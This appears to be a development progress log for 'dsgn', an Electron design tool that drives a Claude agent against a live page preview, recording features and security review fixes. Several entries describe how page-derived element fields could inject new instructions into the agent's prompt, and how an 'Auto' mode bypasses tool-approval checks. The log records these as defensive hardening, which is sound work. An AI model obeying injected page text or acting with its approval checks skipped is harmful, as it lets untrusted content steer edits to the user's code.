- `test/tokens.mjs` proves the priority (manifest wins over a present Tailwind config) and
  each parser (nested Tailwind colors flatten, CSS `var()` aliases skipped) through real IPC,
  plus the palette UI. ✅ `bun run verify` green (8 tests).
- **Adversarial review (7 verified findings, all fixed):**
  - **Tailwind parser correctness** (the two that justified gating the merge): `theme.extend`
    tokens were dropped whenever a base category also existed (the most common Tailwind
    pattern), and the theme search matched *any* nested `theme:` (a plugin/preset could leak
    bogus tokens). Now scoped to the config's actual export and merges base + extend (extend
    wins). Both locked with fixture regression tests.
  - **Prompt-injection regression**: the token-apply path interpolated raw page-derived
    element fields, bypassing the `oneLine` sanitizer used everywhere else — now routed
    through it (+ bounded token name/value); tested with an injected-newline id.
  - Token detect is guarded against a project-switch race; `isColor` covers named colors /
    gradients (via `CSS.supports`); the palette caps tokens per group; tests cover the
    `source: 'none'` state and the seeded-prompt contract.

## 2026-06-23 — Cross-file prop-schema resolution

- The prop editor now resolves a component's schema even when it's imported from another
  file: if there's no same-file react-docgen match, `props.ts` finds the component's relative
  import in the usage file, resolves the module path (tries `.tsx/.ts/.jsx/.js` + `/index`,
  refusing anything outside the project root), and runs react-docgen on the definition file.
- Matches on the **exported** name from the import (`{ Button as B }` → `Button`), so a
  re-export barrel that also defines another component can't mis-attach its schema
  (flagged + fixed in review). Edits still target the usage site, never the definition.
- `test/prop-edit.mjs` extended: `<Button>` used in `Card.tsx` but defined in `Button.tsx`
  resolves Button's enum/string schema with the live usage value. ✅ `bun run verify` green.

## 2026-06-23 — v3 engineer handoff: annotations + Publish→PR

- **Annotations sidecar** (`src/main/annotations.ts`): reviewer notes pinned to elements,
  stored in `<repo>/.dsgn/annotations.json` (list/add/remove via IPC). The agent is denied
  writes anywhere under `.dsgn/` (a guard in `agent.ts` `canUseTool`), so it can't clobber
  the handoff.
- **Pins**: the preview preload draws numbered pins over annotated elements (located by
  selector, repositioned on scroll/resize/HMR); clicking a pin focuses its note in the panel.
- **Renderer**: `useAnnotations` store; an "Add note" composer in the inspector; a
  `NotesPanel` listing notes (with delete) and a **Publish PR** button. Notes load on open,
  pins stay in sync, both clear on project switch/stop.
- **Publish** (`publishToPr`): creates a branch, commits the working changes + notes, pushes,
  and `gh pr create`s with a generated body (notes as a checklist + changed files). Args go
  through `execFile` (no shell). Common failures (no gh / no remote / nothing to publish) are
  surfaced.
- Test `test/annotations.mjs` drives the flow through real IPC: a note saved via the inspector
  persists to the `.dsgn` sidecar, shows in the panel, and removes cleanly. ✅ `bun run verify`
  green (7 tests).
- **Adversarial review (14 verified findings, all fixed):**
  - **Publish was unsafe** — `git add -A` swept the whole working tree (unrelated WIP /
    untracked secrets) into the PR. Now: pre-flight gates (is-repo, not detached, has origin,
    gh present) before any mutation; stage only tracked changes + the `.dsgn` sidecar
    (`add -u`, no untracked sweep); roll back to the original branch on failure (and report
    where the work landed if already committed); clean changed-file list via
    `diff --name-only HEAD` (no porcelain rename-arrow / quoting bugs).
  - The `.dsgn` guard now also blocks **Bash** commands touching the sidecar (was edit-tools
    only; noted that Auto/bypass mode skips `canUseTool` entirely).
  - Annotation writes are serialized (promise-chain mutex) + atomic (tmp + rename), so
    concurrent add/remove can't lose a note and a crash can't truncate the file.
  - `buildPrBody` extracted to a pure `src/shared/pr-body.ts` with a unit test (escapes
    backticks, caps the file list, flattens newlines).
  - Renderer: a failed note save keeps the text (no silent loss); pin-focus scrolls the note
    into view; publish state resets on project switch; pins build once and only reposition
    (no per-scroll churn); the pin interval is cleared on pagehide.

## 2026-06-23 — Prop/token editor (react-docgen + hybrid apply)

- `src/main/props.ts`: given an element's `data-dsgn-source` ("relpath:line"), parse the
  source file with `@babel/parser`, find the JSX element on that line, read its current
  literal attributes, and run **react-docgen** (FindAllDefinitions resolver) for the
  component's prop schema (types, enums, required, descriptions). Both deps are ESM-only,
  so they're dynamic-`import()`ed like the Agent SDK.
- **Hybrid apply**: simple literal props (string/number/boolean/enum) are written straight
  to source via a targeted string splice (formatting-preserving, no codegen dep) → the dev
  server hot-reloads; non-literal/`other` values return `needsAgent` and the renderer seeds
  the agent instead. Path is hardened: `resolveSource` rejects absolute paths and anything
  resolving outside the project root.
- Renderer: an "Edit props" toggle in the inspector reveals `PropEditor`, which renders
  typed controls (text/number/checkbox/enum-select) from the inspection and applies on
  change/blur; `useSession.projectRoot` carries the root needed to resolve sources.
- Test `test/prop-edit.mjs` drives the engine through real IPC (no dev server/auth):
  inspect resolves the schema + live values, apply writes `variant="warn"` to the fixture,
  and the UI renders the typed rows. ✅ `bun run verify` green; also hardened the
  select-element test's retry budget against load-induced flake.
- **Adversarial review (5 verified findings, all fixed):**
  - **Same-line elements** (`<Badge>` inline in an `<li>`/`<p>`) resolved to the *wrong*
    element — the exact-line match returned the first/outermost. Now column-aware (the stamp
    plugin emits `line:col`) and, without a column, picks the innermost element on the line.
    Regression-tested.
  - **Prop-name injection**: an unvalidated name was spliced raw into source. Names are now
    validated against an attribute-name allowlist at every layer (schema, current attrs, and
    the apply IPC boundary).
  - **Wrong schema** attached to imported child components (the `docs[0]` fallback) — now only
    falls back for an anonymous single component, else shows the "no schema" note.
  - Failed applies are **surfaced** in the editor (and the control resets to the file value)
    instead of silently dropping. `projectRoot` is cleared on project (re)open.

## 2026-06-23 — Permission approve/deny cards + Auto mode (SDK)

- `canUseTool` (main) now drives a real approval flow: for any tool the SDK gates, it emits
  a `permission-request` and awaits the user's decision via a per-session pending map,
  resolving the SDK callback on allow/deny — and denying cleanly on abort / epoch change /
  session replace / quit so a torn-down turn never leaves the SDK blocked. Read-only tools
  (Read/Glob/Grep/LS/NotebookRead) are auto-allowed so "Ask" mode stays usable.
- **Permission-mode selector** in the toolbar → `query.setPermissionMode` live, mode also
  passed at project-open so it sticks: **Ask** (`default`), **Auto-accept edits**
  (`acceptEdits`), **Auto: approve all** (`bypassPermissions`). "Auto" is genuine SDK
  bypass — under it the SDK never calls `canUseTool`, so no cards appear.
- Renderer: `usePermissions` store (mode + pending queue, deduped by id); `PermissionCards`
  renders approve/deny cards above the composer; App routes `permission-request`/`-resolved`
  events. `chat-render` test seeds a card, approves it, and asserts the three modes incl.
  `bypassPermissions`. ✅ `bun run verify` green.
- **Adversarial review (8 verified findings, all fixed):**
  - **`bypassPermissions` needs `allowDangerouslySkipPermissions: true`** in the query options
    or the CLI refuses to bypass — so "Auto" silently still prompted. Added the ack flag
    (only takes effect when the user picks Auto; default stays Ask). `agent-e2e` now opens in
    Auto, which both unblocks the unattended edit and live-verifies real bypass.
  - Switching to a more-permissive mode now **releases prompts already on screen** (drains
    `pending` as allow + emits `permission-resolved`); opening another project clears stale
    cards; `set-permission-mode` awaits the SDK before committing, and the toolbar reverts if
    the SDK refuses. `interrupt` drains pending so cards can't orphan. Status line emits only
    after the abort/epoch gate. Each pending now tracks its tool name (for acceptEdits).

## 2026-06-23 — v2 adversarial review + hardening

- Ran a multi-agent review workflow over the v2 diff (security/IPC, lifecycle, renderer/UX,
  test integrity); 11 verified findings, all fixed:
  - **Untrusted page input**: the previewed page controls every picked-element field.
    `describeSelectionForPrompt` now strips control chars/newlines (an injected
    `data-dsgn-source` can't open a new instruction paragraph), validates `source` to a
    `path:line` shape, and caps lengths (code-point/surrogate-safe); the preload also caps
    every field at capture. Full tool-approval gating is still the tracked roadmap item
    (permission cards) — the auto-approving agent is the real backstop to add next.
  - **Forged picks**: the preload now ignores non-`isTrusted` events, so a hostile page
    can't synthesize a click to inject a pick. The test correspondingly switched to a
    *trusted* `webContents.sendInputEvent` click (more faithful than synthetic dispatch).
  - **Stale selection**: opening another project now disarms select mode + clears the pick
    (was leaking a previous repo's source path into the composer); Escape-cancel clears the
    pick too.
  - **Auth banner** now auto-clears once the agent makes progress (was stuck until manually
    dismissed even after the user fixed auth).
  - **Lifecycle**: overlay re-arm is URL-gated (no crosshair on the "no project" placeholder)
    and `preview:reset` clears `selectModeActive` so main/renderer can't desync.
  - **Dead CSS**: `.btn--active` was shadowed by the later base `.btn` rule (equal
    specificity, source order) — the active toggle never rendered blue. Fixed via
    `.btn.btn--active`; the select test now asserts the active background is blue so it
    can't silently regress.

## 2026-06-23 — v2 first slice: click-to-select → source → chat

- **Select overlay** (`src/preview/preload.ts`): a sandboxed preload injected into the
  preview `WebContentsView`. Shadow-DOM hover highlight + click pick; captures tag,
  short CSS path, `data-dsgn-source` stamp (nearest-ancestor), text, rect, and a curated
  set of computed styles. Escape exits select mode. Built as a second preload entry
  (`electron.vite.config.ts` rollup input → `out/preload/preview.js`).
- **IPC**: renderer → main → preview `preview:set-select-mode`; preview → main → renderer
  `preview:element-picked` / `select-cancelled`, with a sender check so only the preview
  view can emit picks. Select mode is re-armed after each preview navigation.
- **UI**: a "Select" toggle in the titlebar (running only), an `Inspector` card above the
  composer (tag, resolved source or "no stamp" note, style chips), and a one-click
  "Ask dsgn to change this…" that seeds the composer with the element + source reference
  so the agent edits the right place. New `useSelection` store.
- **Convention**: `docs/DESIGN.md` documents the `data-dsgn-source` stamp + a reference
  Vite/Babel plugin (dev-only). Shared `SelectedElement` type so preload + renderer can't
  drift; added `tsconfig.preview.json` so the preview preload is type-checked.
- **Polish — first-run auth onboarding**: `isAuthError` heuristic flips an amber banner
  pointing at `claude setup-token` instead of burying a raw 401 in chat.
- **Tests**: `test/select-element.mjs` drives the full path (open fixture → enable select →
  dispatch a click in the preview webContents → assert inspector + source → assert composer
  hand-off) against a new `selectable-app` fixture; `chat-render` now also asserts the auth
  banner. ✅ `bun run verify` green (smoke, open-preview, chat-render, select-element);
  agent-e2e SKIPs cleanly without creds. Artifacts `06`/`07`/`08`.

## 2026-06-23 — Logging, cross-machine handoff, self-testing

- Added `CLAUDE.md` + `docs/{CONTEXT,PROGRESS,TASKS}.md` so progress/context/tasks
  live in-repo and travel via git (continue on any machine after `git pull`).
- Added `test/agent-e2e.mjs`: a REAL Claude turn that opens an editable fixture,
  asks the agent to change a heading, and asserts the file changed. SKIPs without
  auth, FAILs if the turn ran but didn't edit. Added `bun run verify`.
- ✅ Ran `bun run verify` with credentials present: **AGENT-E2E OK** — the agent
  edited the fixture via a live turn. Confirms end-to-end agent works and the SDK
  CLI subprocess spawns correctly inside Electron (prior runtime risk resolved).

## 2026-06-23 — Adversarial review fixes

- Ran a multi-agent review workflow (15 verified findings); fixed: session
  epoch-guard (no stale events across project switches), composer-stuck-on-switch,
  `sandbox:true` on main + preview windows, preview hardening (window-open handler +
  will-navigate origin pin + validate `preview:load` is local http(s)), per-outage
  retry reset, resize-drag release on blur/visibilitychange, `/` menu Escape re-arm,
  CSP `object-src`/`base-uri`.

## 2026-06-22/23 — Chat upgrade + controls + UX

- Markdown rendering (react-markdown + remark-gfm + rehype-highlight, hand-written
  hljs theme, plain CSS).
- Composer toolbar: model picker (live `setModel`), thinking/effort selector,
  `/` skill menu from the SDK init `slash_commands`.
- Drag-to-resize split (hides native preview during drag). Custom dev-command
  escape hatch on launch failure; Reload/Stop controls.

## 2026-06-22 — Real Agent SDK chat

- Wired `@anthropic-ai/claude-agent-sdk` (ESM, dynamic import): persistent
  multi-turn `query()`, cwd=repo, `settingSources` + `claude_code` preset,
  streaming deltas + tool status over IPC, `canUseTool` auto-approve.
- Fixed ESM-in-CJS crash; preview readiness polling + retry for `ERR_EMPTY_RESPONSE`;
  dev-server ownership + cleanup-on-quit + conflict errors.

## 2026-06-22 — Scaffold + preview + tests

- electron-vite + React + TS shell; two-pane layout; native `WebContentsView`
  preview with IPC geometry sync; typed `window.api`; dev-server runner
  (detect/spawn/parse/readiness). Playwright+Electron smoke + open→preview tests.
- Made dsgn its own standalone git repo.
